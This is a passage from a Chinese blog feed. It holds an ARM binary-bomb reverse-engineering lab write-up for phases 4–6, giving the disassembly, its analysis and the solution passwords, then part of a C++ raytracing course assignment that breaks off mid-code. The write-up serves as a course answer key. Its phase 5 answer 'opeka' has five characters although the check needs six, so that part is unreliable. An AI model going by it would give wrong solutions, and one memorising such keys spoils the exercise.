○3 87b0: ebffffd2 bl 8700 &lt;func4&gt;///////////////////////////////////87b4: e1a03000 mov r3, r087b8: e3530008 cmp r3, #887bc: 0a000000 beq 87c4 &lt;phase_4+0x64&gt; ○887c0: eb00024e bl 9100 &lt;explode_bomb&gt;87c4: e24bd004 sub sp, fp, #487c8: e8bd4800 pop &#123;fp, lr&#125;87cc: e12fff1e bx lr87d0: 0006485c .word 0x0006485c00008700 &lt;func4&gt;:8700: e92d4810 push &#123;r4, fp, lr&#125;8704: e28db008 add fp, sp, #88708: e24dd00c sub sp, sp, #12870c: e50b0010 str r0, [fp, #-16]8710: e51b3010 ldr r3, [fp, #-16]8714: e3530001 cmp r3, #1 ○48718: da00000b ble 874c &lt;func4+0x4c&gt;////////////////////////////////////////////871c: e51b3010 ldr r3, [fp, #-16]8720: e2433001 sub r3, r3, #18724: e1a00003 mov r0, r3 ○58728: ebfffff4 bl 8700 &lt;func4&gt;/////////////////////////////////////////////872c: e1a04000 mov r4, r08730: e51b3010 ldr r3, [fp, #-16]8734: e2433002 sub r3, r3, #2 ○68738: e1a00003 mov r0, r3873c: ebffffef bl 8700 &lt;func4&gt;8740: e1a03000 mov r3, r08744: e0843003 add r3, r4, r38748: ea000000 b 8750 &lt;func4+0x50&gt;874c: e3a03001 mov r3, #18750: e1a00003 mov r0, r3 8754: e24bd008 sub sp, fp, #8 ○78758: e8bd4810 pop &#123;r4, fp, lr&#125;875c: e12fff1e bx lr 反汇编分析○1处是输入的参数的形式，位于87d0处，利用IDA pro找到了87d0引用了0006485C数据段的数据，为 即要求输入一个数字。○2处判断是否是输入的参数是否大于0，如果大于0则继续判断，如果不是则explode_bomb。○3处将输入的数传入r0中作为参数然后调用func4()。○4首先将传入的参数存入fp-16中，然后判断参数是否小于等于1，如果小于等于1的话就跳到○7处，○7处将返回值赋值为1，然后pop返回值和参数；如果大于1的话就到○5，○5和○6的逻辑就是分别让参数-1和-2，然后再分别调用func4，由此可以看出该bomb的逻辑是一个递归的调用。其c语言的伪代码如下： 1234567func4(int i)&#123; if(i &lt; = 1) return 1; else return func4(i-1) + func4(i-2);&#125; 然后看代码块○8，其将func4函数的返回值与8进行比较，如果等于8就通过，否则explode_bomb。所以通过计算可以得出输入的值为5。 密码5 Phase 5Arm指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455000087d4 &lt;phase_5&gt;:87d4: e92d4800 push &#123;fp, lr&#125;87d8: e28db004 add fp, sp, #487dc: e24dd018 sub sp, sp, #2487e0: e50b0018 str r0, [fp, #-24] ; 0xffffffe887e4: e51b0018 ldr r0, [fp, #-24] ; 0xffffffe887e8: eb000144 bl 8d00 &lt;string_length&gt;87ec: e1a03000 mov r3, r087f0: e3530006 cmp r3, #6 ○187f4: 0a000000 beq 87fc &lt;phase_5+0x28&gt;87f8: eb000240 bl 9100 &lt;explode_bomb&gt;////////////////////////////////////////87fc: e3a03000 mov r3, #08800: e50b3008 str r3, [fp, #-8]○28804: ea00000f b 8848 &lt;phase_5+0x74&gt;////////////////////////////////////////8808: e51b1008 ldr r1, [fp, #-8]880c: e51b3008 ldr r3, [fp, #-8]8810: e51b2018 ldr r2, [fp, #-24] ; 0xffffffe88814: e0823003 add r3, r2, r3○48818: e5d33000 ldrb r3, [r3]881c: e203300f and r3, r3, #15///////////////////////////////////////8820: e59f2060 ldr r2, [pc, #96] ; 8888 &lt;phase_5+0xb4&gt;8824: e7d22003 ldrb r2, [r2, r3] ○5///////////////////////////////////////8828: e3e0300b mvn r3, #11882c: e24b0004 sub r0, fp, #48830: e0801001 add r1, r0, r1 ○68834: e0813003 add r3, r1, r38838: e5c32000 strb r2, [r3]////////////////////////////////////883c: e51b3008 ldr r3, [fp, #-8]8840: e2833001 add r3, r3, #1 ○78844: e50b3008 str r3, [fp, #-8]////////////////////////////////////8848: e51b3008 ldr r3, [fp, #-8]884c: e3530005 cmp r3, #5 ○38850: daffffec ble 8808 &lt;phase_5+0x34&gt;///////////////////////////////////8854: e3a03000 mov r3, #08858: e54b300a strb r3, [fp, #-10]885c: e24b3010 sub r3, fp, #16 8860: e1a00003 mov r0, r3 ○88864: e59f1020 ldr r1, [pc, #32] ; 888c &lt;phase_5+0xb8&gt;8868: eb000140 bl 8d70 &lt;strings_not_equal&gt;886c: e1a03000 mov r3, r08870: e3530000 cmp r3, #08874: 0a000000 beq 887c &lt;phase_5+0xa8&gt;8878: eb000220 bl 9100 &lt;explode_bomb&gt;887c: e24bd004 sub sp, fp, #48880: e8bd4800 pop &#123;fp, lr&#125;8884: e12fff1e bx lr8888: 0008216c .word 0x0008216c888c: 00064860 .word 0x00064860 反汇编分析○1中代码首先判断读入的字符串的长度，如果长度等于6则跳到代码块○2中去，如果不等于6则explode_bomb。在代码块○2中，首先将计数变量i置为0，然后跳到代码块○3中去，在代码块○3中先判断i是否小于等于5，如果小于等于5的话就跳入○4中，其中○4○5○6○7为for循环的主体，我将其化成了这4部分。其中在○4的逻辑如下：取出字符串的第i个字符s[i],然后将s[i]与0xF相与，其中一个char为一个字节，由两个16进制数组成，做相与运算后就只取出char的后4个b，将数值存入r3中。然后到代码块○5中，找到数据pc+96（8888）处的数据，根据IDA pro得出其引用的是0008216C处的数据，数据如图： ，然后根据r3中的数值作为索引取得相应的字符，将得到的字符存入r2中，然后到代码块○6中，其将r2的数据存入(fp-4-11)+i的地址处。代码○7是将i++。所以该段代码的伪代码如下： 12345for(i = 0;i &lt;= 5;i++)&#123; int a = (int)(s[i]&amp;0xF); s1[i] = 0x0008216c+a;&#125; 其中s为输入的字符串，s1为找到的字符串。for循环结束了之后，得到长度为6的s1字符串，到了代码块○8中，该逻辑是将s1与（pc-32）即888c处的字符串进行比较，根据IDA pro得到引用了数据段00064860处的数据为： 所以只有当s1为”giants”时，才能通过，即索引顺序为0xF,0x0,0x5,0xB,0xD,0x1，查ascii表得到后4个b分别为这些的十六进制的数的字符分别为opeka（可能有多重情况，只要后4个b分别对应那五个十六进制数的字符即可）。 密码opeka Phase 6指令及逻辑分析：由于该炸弹的指令及逻辑较长，所以指令分开了几份分别进行分析。 00008890 : 读入六个数12345678910 8890: e92d4800 push &#123;fp, lr&#125;8894: e28db004 add fp, sp, #48898: e24dd048 sub sp, sp, #72 ; 0x48889c: e50b0048 str r0, [fp, #-72] ; 0xffffffb888a0: e59f3234 ldr r3, [pc, #564] ; 8adc &lt;phase_6+0x24c&gt;88a4: e50b3010 str r3, [fp, #-16]88a8: e24b3028 sub r3, fp, #40 ; 0x2888ac: e51b0048 ldr r0, [fp, #-72] ; 0xffffffb888b0: e1a01003 mov r1, r388b4: eb0000f0 bl 8c7c &lt;read_six_numbers&gt; 以上的指令的逻辑比较简单，是首先读入六个数字，并将其放入数组中，假设数组为a。 对这六个数的值进行判定1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 88b8: e3a03000 mov r3, #088bc: e50b300c str r3, [fp, #-12]88c0: e51b200c ldr r2, [fp, #-12] ○1////////////////////////////////////88c4: e3e03023 mvn r3, #35 ; 0x2388c8: e1a02102 lsl r2, r2, #288cc: e24b0004 sub r0, fp, #488d0: e0802002 add r2, r0, r2 ○288d4: e0823003 add r3, r2, r388d8: e5933000 ldr r3, [r3]///////////////////////////////////88dc: e2433001 sub r3, r3, #188e0: e3530005 cmp r3, #5 ○388e4: 9a000000 bls 88ec &lt;phase_6+0x5c&gt;88e8: eb000204 bl 9100 &lt;explode_bomb&gt;//////////////////////////////////88ec: e51b300c ldr r3, [fp, #-12]88f0: e2833001 add r3, r3, #1 ○488f4: e50b3008 str r3, [fp, #-8]88f8: ea000013 b 894c &lt;phase_6+0xbc&gt;//////////////////////////////////88fc: e51b200c ldr r2, [fp, #-12]8900: e3e03023 mvn r3, #35 ; 0x238904: e1a02102 lsl r2, r2, #28908: e24b1004 sub r1, fp, #4 ○6890c: e0812002 add r2, r1, r2 8910: e0823003 add r3, r2, r38914: e5932000 ldr r2, [r3]//////////////////////////////////8918: e51b1008 ldr r1, [fp, #-8]891c: e3e03023 mvn r3, #35 ; 0x238920: e1a01101 lsl r1, r1, #28924: e24b0004 sub r0, fp, #4 ○78928: e0801001 add r1, r0, r1892c: e0813003 add r3, r1, r38930: e5933000 ldr r3, [r3]/////////////////////////////////8934: e1520003 cmp r2, r38938: 1a000000 bne 8940 &lt;phase_6+0xb0&gt; 893c: eb0001ef bl 9100 &lt;explode_bomb&gt;8940: e51b3008 ldr r3, [fp, #-8]○88944: e2833001 add r3, r3, #18948: e50b3008 str r3, [fp, #-8]///////////////////////////////////894c: e51b3008 ldr r3, [fp, #-8]8950: e3530005 cmp r3, #5 ○58954: daffffe8 ble 88fc &lt;phase_6+0x6c&gt;//////////////////////////////////8958: e51b300c ldr r3, [fp, #-12]895c: e2833001 add r3, r3, #18960: e50b300c str r3, [fp, #-12] ○98964: e51b300c ldr r3, [fp, #-12]8968: e3530005 cmp r3, #5896c: daffffd3 ble 88c0 &lt;phase_6+0x30&gt;8970: e3a03000 mov r3, #08974: e50b300c str r3, [fp, #-12] 以上的指令为两个for循环的嵌套。其中○1为(fp-12)处存的变量假设为i，把变量i的值存入r2，然后代码段○2处为取出a[i]的值并将其存入r3中，紧接着代码段○3处判断r3的值是否大于6，如果大于6就explode_bomb。然后进入代码块○4中，在此就进入了第二个for循环，首先初始化(fp-8)处的变量，设为j，j = i+1;然后进入代码段○5处对j的值进行判断，如果大于5就进入代码段○9，其中代码○9是将i增1并进行判断，如果i大于5就跳出for循环，如果小于5则跳至○1再进行一次for循环，对于代码○5处的判断如果j小于等于5的话，则跳入代码○6处，其中逻辑为取出a[i]的值将其放入r2中，然后进入○7中，取出a[j]的值将其放入r3中，然后进入○8，将r2和r3进行比较，如果相等的话就explode_bomb,不行等就进入○5，又进行了一次循环。其伪代码如下： 12345678for(int i = 0;i &lt;= 5;i++) &#123;if(a[i]&gt;6) explode_bomb(); for(int j = i+1;j&lt;=5;j++) &#123;if(a[j] == a[i]) explode_bomb();&#125;&#125; 根据输入的6个数把链表的6个node进行索引排序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970 8978: e59f315c ldr r3, [pc, #348] ; 8adc &lt;phase_6+0x24c&gt; 897c: e50b3010 str r3, [fp, #-16]8980: e3a03001 mov r3, #1 ○18984: e50b3008 str r3, [fp, #-8]8988: ea000005 b 89a4 &lt;phase_6+0x114&gt;/////////////////////////////////////////////898c: e51b3010 ldr r3, [fp, #-16]8990: e5933008 ldr r3, [r3, #8]8994: e50b3010 str r3, [fp, #-16] ○38998: e51b3008 ldr r3, [fp, #-8]899c: e2833001 add r3, r3, #189a0: e50b3008 str r3, [fp, #-8]////////////////////////////////////////89a4: e51b200c ldr r2, [fp, #-12]89a8: e3e03023 mvn r3, #35 ; 0x2389ac: e1a02102 lsl r2, r2, #289b0: e24b1004 sub r1, fp, #489b4: e0812002 add r2, r1, r2 ○289b8: e0823003 add r3, r2, r389bc: e5932000 ldr r2, [r3]89c0: e51b3008 ldr r3, [fp, #-8]89c4: e1520003 cmp r2, r389c8: caffffef bgt 898c &lt;phase_6+0xfc&gt;////////////////////////////////////////////89cc: e51b200c ldr r2, [fp, #-12]89d0: e3e0303b mvn r3, #59 ; 0x3b89d4: e1a02102 lsl r2, r2, #289d8: e24b0004 sub r0, fp, #4 ○489dc: e0802002 add r2, r0, r289e0: e0823003 add r3, r2, r389e4: e51b2010 ldr r2, [fp, #-16]89e8: e5832000 str r2, [r3]///////////////////////////////////////////89ec: e51b300c ldr r3, [fp, #-12]89f0: e2833001 add r3, r3, #189f4: e50b300c str r3, [fp, #-12] ○589f8: e51b300c ldr r3, [fp, #-12]89fc: e3530005 cmp r3, #58a00: daffffdc ble 8978 &lt;phase_6+0xe8&gt;///////////////////////////////////////////8a04: e51b3040 ldr r3, [fp, #-64] ; 0xffffffc08a08: e50b3010 str r3, [fp, #-16]○98a0c: e3a03001 mov r3, #18a10: e50b300c str r3, [fp, #-12]/////////////////////////////////////////8a14: e51b200c ldr r2, [fp, #-12]8a18: e3e0303b mvn r3, #59 ; 0x3b8a1c: e1a02102 lsl r2, r2, #28a20: e24b1004 sub r1, fp, #4 8a24: e0812002 add r2, r1, r2○68a28: e0823003 add r3, r2, r38a2c: e5932000 ldr r2, [r3]8a30: e51b3010 ldr r3, [fp, #-16]8a34: e5832008 str r2, [r3, #8]///////////////////////////////////////8a38: e51b200c ldr r2, [fp, #-12]8a3c: e3e0303b mvn r3, #59 ; 0x3b8a40: e1a02102 lsl r2, r2, #2○78a44: e24b0004 sub r0, fp, #48a48: e0802002 add r2, r0, r28a4c: e0823003 add r3, r2, r38a50: e5933000 ldr r3, [r3]8a54: e50b3010 str r3, [fp, #-16]////////////////////////////////////8a58: e51b300c ldr r3, [fp, #-12]8a5c: e2833001 add r3, r3, #18a60: e50b300c str r3, [fp, #-12] ○88a64: e51b300c ldr r3, [fp, #-12]8a68: e3530005 cmp r3, #58a6c: daffffe8 ble 8a14 &lt;phase_6+0x184&gt; 该段代码也有一个for循环的嵌套。首先初始化，将(PC+348)的索引的数存入r3中，由ida pro得出具体数据为 所以将node1的索引传入r3，然后跳入到代码块○2，其逻辑是先取出a[i]的数据至r2，然后取出j至r3，比较这两个数据的大小，如果r2 &gt;r3,就跳到代码段○3，该逻辑是将r3+0x8的数据存入fp-16中，有以上的数据可知该数据为0x20A0，用IDA pro查找到为： 以此类推，根据每个节点的第8个字节处的数据作为下一个节点的地址，直到找到链表的a[i]个元素，就会跳出该内层的for循环，然后进入代码块○4，该逻辑是将该node的地址存入-0x3c+[R11] + 4 * i中，然后进入代码块○5，其逻辑是使变量i增1，然后判断是否大于5，如果小于5再跳入○1中继续循环。其for循环的伪代码如下： 1234567for(int i = 0;i &lt;=5;i++)&#123; node = 0x000820AC; for(int j = 1;j&lt;a[i];j++) node = *(node+0x8); -0x3c+[R11] + 4 * i = node;&#125; 所以经过上一个for循环的嵌套，从-0x3c+[R11]开始就有了这些节点的地址的索引，然后进入代码段○9，其逻辑是先将fp-12处的变量i初始化为1，目的是进入for循环。进入代码段○6,其目的是将*((-0x3c+[R11]+i-1)+0x8) = (-0x3c+[R11]+i)；然后进入代码段○7，其目的是将当前节点设为-0x3c+[R11]+i处的地址所指向的节点，进入代码块○8，使i增1并判断和5的大小关系。 判断链表的节点的数值是否是按从大到小的顺序排列的1234567891011121314151617181920212223242526278a70: e51b3010 ldr r3, [fp, #-16]8a74: e3a02000 mov r2, #08a78: e5832008 str r2, [r3, #8]8a7c: e3a03000 mov r3, #0 ○18a80: e50b300c str r3, [fp, #-12]8a84: e51b3040 ldr r3, [fp, #-64] ; 0xffffffc08a88: e50b3010 str r3, [fp, #-16]//////////////////////////////////////8a8c: e51b3010 ldr r3, [fp, #-16]8a90: e5932000 ldr r2, [r3]8a94: e51b3010 ldr r3, [fp, #-16]8a98: e5933008 ldr r3, [r3, #8] ○28a9c: e5933000 ldr r3, [r3]8aa0: e1520003 cmp r2, r38aa4: aa000000 bge 8aac &lt;phase_6+0x21c&gt;8aa8: eb000194 bl 9100 &lt;explode_bomb&gt;//////////////////////////////////////////8aac: e51b3010 ldr r3, [fp, #-16]8ab0: e5933008 ldr r3, [r3, #8] ○38ab4: e50b3010 str r3, [fp, #-16]///////////////////////////////////////8ab8: e51b300c ldr r3, [fp, #-12]8abc: e2833001 add r3, r3, #1 8ac0: e50b300c str r3, [fp, #-12] ○48ac4: e51b300c ldr r3, [fp, #-12]8ac8: e3530004 cmp r3, #48acc: daffffee ble 8a8c &lt;phase_6+0x1fc&gt; 首先进入○1进行初始化，将（fp-16）处的地址换为链表的第一个node，并对（fp-12）的变量i初始化为0。然后进入代码块○2，首先获得当前node的地址，并将该node的数据存入r2中，地址存入r3中，然后通过[r3+8]获得下一个node的地址，并将下一个node的地址存入r3中，然后比较r2和r3的值，如果r2小于r3，就explode_bomb,如果不小于就进入代码块○3，该逻辑是将当前节点（fp-16）的地址改为[r3+8]处的数值，即为下一个节点的地址，然后进入代码○4，对变量i进行增1操作，并判断和4的大小。其伪代码如下：其中node的数据结构如下： 1234567891011121314struct node &#123; int x, y; node *next; &#125;;//进行判断：node a = firstNode; for(int i = 0; i &lt; 5; i++)&#123; node b = a-&gt;next; if (a-&gt;x &gt;= b-&gt;x) a = b; else explode_bomb(); &#125; 所以根据逻辑，先找出每个节点的数据，然后再根据输入的数进行排序，保证其是从大到小的顺序排列的。根据IDA pro找到每个node所在的地址为：地址 数据 下个节点地址0x820AC 0xFD 0x820A00x820A0 0x2D5 0x820940x82094 0x12D 0x820880x82088 0x3E5 0x8207C0x8207C 0xD4 0x820700x82070 0x1B0 所以由大到小排列的话就为4 2 6 3 1 5 密码 4 2 6 3 1 5]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>binary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raytracing]]></title>
    <url>%2F2017%2F04%2F13%2FRaytracing%2F</url>
    <content type="text"><![CDATA[题目要求本程序是根据Raytracing的要求所写。 该题目要求根据其所给的框架程序来实现raytracing的功能。 具体实现 环境是virual studio 2015和opengl 具体代码及分析如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946/*CSCI 480Assignment 3 RaytracerName: &lt;binpang&gt;*/#define _CRT_SECURE_NO_WARNINGS#define GLUT_DISABLE_ATEXIT_HACK#include &lt;pic.h&gt;#include &lt;windows.h&gt;#include &lt;GL/glu.h&gt;#include &lt;GL/glut.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string&gt;#include &lt;math.h&gt;#include &lt;vector&gt;#define MAX_TRIANGLES 2000#define MAX_SPHERES 10#define MAX_LIGHTS 10char *filename=0;#define MODE_DISPLAY 1#define MODE_JPEG 2int mode=MODE_DISPLAY;#define WIDTH 640#define HEIGHT 480#define fov 60.0#define PI 3.1415926int MaxStep = 10;int Steps = 0;//求出投射的屏幕的x和y的最大范围的坐标double yMax = tan((double)PI*fov / (2 * 180));double xMax = yMax*((double)WIDTH) / ((double)HEIGHT);unsigned char buffer[HEIGHT][WIDTH][3];struct Vertex&#123; double position[3]; double color_diffuse[3];//漫射 double color_specular[3]; //反射 double normal[3]; double shininess;&#125;;typedef struct _Triangle&#123; struct Vertex v[3];&#125; Triangle;typedef struct _Sphere&#123; double position[3]; double color_diffuse[3]; double color_specular[3]; double shininess; double radius;&#125; Sphere;typedef struct _Light&#123; double position[3]; double color[3];&#125; Light;//表示点的结构struct point&#123; double x; double y; double z;&#125;;//点在里面还是在外面struct isIn&#123; bool in; //当在三角形外面时为0，当在里面时为1 double bary[3];&#125;;//交点的结构struct intexPoint&#123; point p; double t; int tID; //物体在数组中的标号 int tObj; //如果是1表示点在圆上，如果为2表示在三角形上 isIn iO; &#125;;Triangle triangles[MAX_TRIANGLES];Sphere spheres[MAX_SPHERES];Light lights[MAX_LIGHTS];double ambient_light[3];struct point cam;int num_triangles=0;int num_spheres=0;int num_lights=0;void plot_pixel_display(int x,int y,unsigned char r,unsigned char g,unsigned char b);void plot_pixel_jpeg(int x,int y,unsigned char r,unsigned char g,unsigned char b);void plot_pixel(int x,int y,unsigned char r,unsigned char g,unsigned char b);point reflect(intexPoint p, point dir);point Render(point p, point dir);//两个点进行相减point minusPoint(point A, point B)&#123; point C; C.x = A.x - B.x; C.y = A.y - B.y; C.z = A.z - B.z; return C;&#125;//向量除以一个数point DivConst(point A, double a)&#123; point B; B.x = 0.0; B.y = 0.0; B.z = 0.0; if (abs(a) &gt; 1e-10) &#123; B.x = A.x / a; B.y = A.y / a; B.z = A.z / a; &#125; return B;&#125;//计算向量的大小double caculateSize(point A)&#123; double size; size = sqrt(pow(A.x, 2) + pow(A.y, 2) + pow(A.z, 2)); return size;&#125;//单位化向量point unitize(point A)&#123; point uni; double size; size = caculateSize(A); uni = DivConst(A, size); return uni;&#125;//点乘double dot(point A, point B)&#123; double C; C = (A.x*B.x + A.y*B.y + A.z*B.z); return C;&#125;//叉乘point cross(point A, point B)&#123; point C; C.x = (A.y*B.z - B.y*A.z); C.y = (B.x*A.z - A.x*B.z); C.z = (A.x*B.y - A.y*B.x); return C;&#125;//求出距离src，方向为dir，长度为t的点point caluPoint(point src, point dir, double t)&#123; point p; p.x = src.x + t*(dir.x); p.y = src.y + t*(dir.y); p.z = src.z + t*(dir.z); return p;&#125;//与球的交点double intersectSphere(Sphere sphere, point src, point dir)&#123; double b, c, t, t1, t2; t1 = 0; t2 = 0; c = pow((src.x - sphere.position[0]), 2) + pow((src.y - sphere.position[1]), 2) + pow((src.z - sphere.position[2]), 2) - pow(sphere.radius, 2); b = 2 * (dir.x*(src.x - sphere.position[0]) + dir.y*(src.y - sphere.position[1]) + dir.z*(src.z - sphere.position[2]) ); //检查判别式是否大于0 if ((pow(b, 2) - 4 * c) &gt; 0) &#123; t1 = (((-1)*b) + sqrt(pow(b, 2) - 4 * c)) / 2; t2 = (((-1)*b) - sqrt(pow(b, 2) - 4 * c)) / 2; if (t1 &lt;= t2) t = t1; else t = t2; if (t &lt; 0) t = -1; else if (t&lt;1e-10) &#123; if (t1&lt;1e-15 &amp;&amp; t2&gt;1e-15) t = t2; else if (t2&lt;1e-15 &amp;&amp; t1&gt;1e-15) t = t1; else t = -1; &#125; &#125; else t = -1; return t;&#125;//获得两个顶点之间的边point getSide(Vertex v1, Vertex v2)&#123; point c; c.x = v1.position[0] - v2.position[0]; c.y = v1.position[1] - v2.position[1]; c.z = v1.position[2] - v2.position[2]; return c;&#125;//判断两个点是否相等bool checkEqual(point A, point B)&#123; bool equ; if ((abs(A.x - B.x)&lt;1e-10) &amp;&amp; (abs(A.y - B.y)&lt;1e-10) &amp;&amp; (abs(A.z - B.z)&lt;1e-10)) equ = 1; else equ = 0; return equ;&#125;double intersectTriangle(Triangle triangle, point src, point dir,isIn* iO)&#123; point AB, AC, DirxAC; float u, v, t; //isIn iO; AB = getSide(triangle.v[1], triangle.v[0]); AC = getSide(triangle.v[2], triangle.v[0]); DirxAC = cross(dir, AC); float det = dot(AB, DirxAC); point T; point p1; p1.x = triangle.v[0].position[0]; p1.y = triangle.v[0].position[1]; p1.z = triangle.v[0].position[2]; if (det &gt;0) &#123; T = minusPoint(src, p1);&#125; else &#123; T = minusPoint(p1, src); det = -det; &#125; if (det &lt; 1e-10) &#123; iO-&gt;in = -1; return -1; &#125; u = dot(T, DirxAC); if (u &lt; 0.0f || u &gt; det) &#123; iO-&gt;in = -1; return -1; &#125; point Q = cross(T, AB); v = dot(dir, Q); if (v &lt; 0.0f || u + v &gt; det) &#123; iO-&gt;in = -1; return -1; &#125; t = dot(AC, Q); //t = -t; float fInvDet = 1.0f / det; t *= fInvDet; u *= fInvDet; v *= fInvDet; iO-&gt;in = 1; iO-&gt;bary[0] = u; iO-&gt;bary[1] = v; iO-&gt;bary[2] = 1 - u - v; return t;&#125;//找到p点在圆上的的法向量，tID为spheres数组中的标号point findSphereNormal(point p, int tID)&#123; point n; // based on the equation n.x = (p.x - spheres[tID].position[0]) / spheres[tID].radius; n.y = (p.y - spheres[tID].position[1]) / spheres[tID].radius; n.z = (p.z - spheres[tID].position[2]) / spheres[tID].radius; return n;&#125;//三角形的线性插值,如果ID为0则表示法线插值,如果ID为1则表示漫反射，如果为2则表示镜面反射point chazhi(Triangle triangle, isIn iO, int ID)&#123; point P; if (ID == 0) &#123; P.x = iO.bary[0] * triangle.v[0].normal[0] + iO.bary[1] * triangle.v[1].normal[1] + iO.bary[2] * triangle.v[2].normal[2]; P.y = iO.bary[0] * triangle.v[0].normal[1] + iO.bary[1] * triangle.v[1].normal[1] + iO.bary[2] * triangle.v[2].normal[1]; P.z = iO.bary[0] * triangle.v[0].normal[2] + iO.bary[1] * triangle.v[1].normal[2] + iO.bary[2] * triangle.v[2].normal[2]; &#125; else if (ID == 1) &#123; P.x = iO.bary[0] * triangle.v[0].color_diffuse[0] + iO.bary[1] * triangle.v[1].color_diffuse[0] + iO.bary[2] * triangle.v[2].color_diffuse[0]; P.y = iO.bary[0] * triangle.v[0].color_diffuse[1] + iO.bary[1] * triangle.v[1].color_diffuse[1] + iO.bary[2] * triangle.v[2].color_diffuse[1]; P.z = iO.bary[0] * triangle.v[0].color_diffuse[2] + iO.bary[1] * triangle.v[1].color_diffuse[2] + iO.bary[2] * triangle.v[2].color_diffuse[2]; &#125; else if (ID == 2) &#123; P.x = iO.bary[0] * triangle.v[0].color_specular[0] + iO.bary[1] * triangle.v[1].color_specular[0] + iO.bary[2] * triangle.v[2].color_specular[0]; P.y = iO.bary[0] * triangle.v[0].color_specular[1] + iO.bary[1] * triangle.v[1].color_specular[1] + iO.bary[2] * triangle.v[2].color_specular[1]; P.z = iO.bary[0] * triangle.v[0].color_specular[2] + iO.bary[1] * triangle.v[1].color_specular[2] + iO.bary[2] * triangle.v[2].color_specular[2]; &#125; return P;&#125;//公式模型I_spec = k_z * I_l(V • ((2N • L)N - L))^n_s//其中R = (2N • L)N - Lpoint phong(point p, int id, int Obj, isIn iO, Light light, point camera)&#123; point n, l, v, r, kd, ks; point po; double lDotN, rDotV, n_s; //用point表示light的位置 l.x = light.position[0]; l.y = light.position[1]; l.z = light.position[2]; //l = l - p; //入射光线 l = unitize(minusPoint(l, p)); //v = camera - p; //观察者到p点的射线 v = unitize(minusPoint(camera, p)); if (Obj == 1) &#123; n = findSphereNormal(p, id); kd.x = spheres[id].color_diffuse[0]; kd.y = spheres[id].color_diffuse[1]; kd.z = spheres[id].color_diffuse[2]; ks.x = spheres[id].color_specular[0]; ks.y = spheres[id].color_specular[1]; ks.z = spheres[id].color_specular[2]; n_s = spheres[id].shininess; &#125; else if (Obj == 2) &#123; n = unitize(chazhi(triangles[id], iO, 0)); kd = chazhi(triangles[id], iO, 1); ks = chazhi(triangles[id], iO, 2); n_s = iO.bary[0] * triangles[id].v[0].shininess + iO.bary[1] * triangles[id].v[1].shininess + iO.bary[2] * triangles[id].v[2].shininess; &#125; lDotN = dot(l, n); if (lDotN&lt;0) lDotN = 0; else if (lDotN&gt;1.f) lDotN = 1.f; //R = (2N • L)N - L r.x = 2 * lDotN*n.x - l.x; r.y = 2 * lDotN*n.y - l.y; r.z = 2 * lDotN*n.z - l.z; rDotV = dot(r, v); if (rDotV&lt;0) rDotV = 0; else if (rDotV&gt;1.f) rDotV = 1.f; //计算该点的颜色r,g,b po.x = light.color[0] * ((kd.x)*lDotN + ((ks.x)*pow((rDotV), (n_s)))); // r po.y = light.color[1] * ((kd.y)*lDotN + ((ks.y)*pow((rDotV), (n_s)))); // g po.z = light.color[2] * ((kd.z)*lDotN + ((ks.z)*pow((rDotV), (n_s)))); // b return po;&#125;/*与物体相交*/intexPoint intersectObjects(point p1, point p2, point dir, int flag)&#123; point p, q,raySrc, pixPoint; intexPoint intxObj; isIn iO; iO.in = -1; double t, t1, t2, tS, tT; int id, Obj; q = p1; t1 = 0; id = -1; Obj = -1; raySrc = p1; //找到最近的交点 for (int i = 0; i &lt; num_spheres; i++) &#123; tS = intersectSphere(spheres[i], raySrc, dir); if (t1 == 0 &amp;&amp; tS &gt; 1e-10) &#123; t1 = tS; id = i; Obj = 1; &#125; else if (tS &lt;= t1 &amp;&amp; tS &gt; 1e-10) &#123; t1 = tS; id = i; Obj = 1; &#125; &#125; for (int i = 0; i &lt; num_triangles; i++) &#123; tT = intersectTriangle(triangles[i], raySrc, dir, &amp;iO); p = caluPoint(raySrc, dir, tT); //找到交点 //iO = isInTest(triangles[i], p); //判断p点是否在三角形内 if (iO.in == 1) &#123; if (t1 == 0 &amp;&amp; tT &gt; 1e-5) &#123; t1 = tT; id = i; Obj = 2; if (flag == 0) q = p; intxObj.iO.bary[0] = iO.bary[0]; intxObj.iO.bary[1] = iO.bary[1]; intxObj.iO.bary[2] = iO.bary[2]; &#125; else if (tT&lt;t1 &amp;&amp; tT&gt;1e-5) &#123; t1 = tT; id = i; Obj = 2; if (flag == 0) q = p; intxObj.iO.bary[0] = iO.bary[0]; 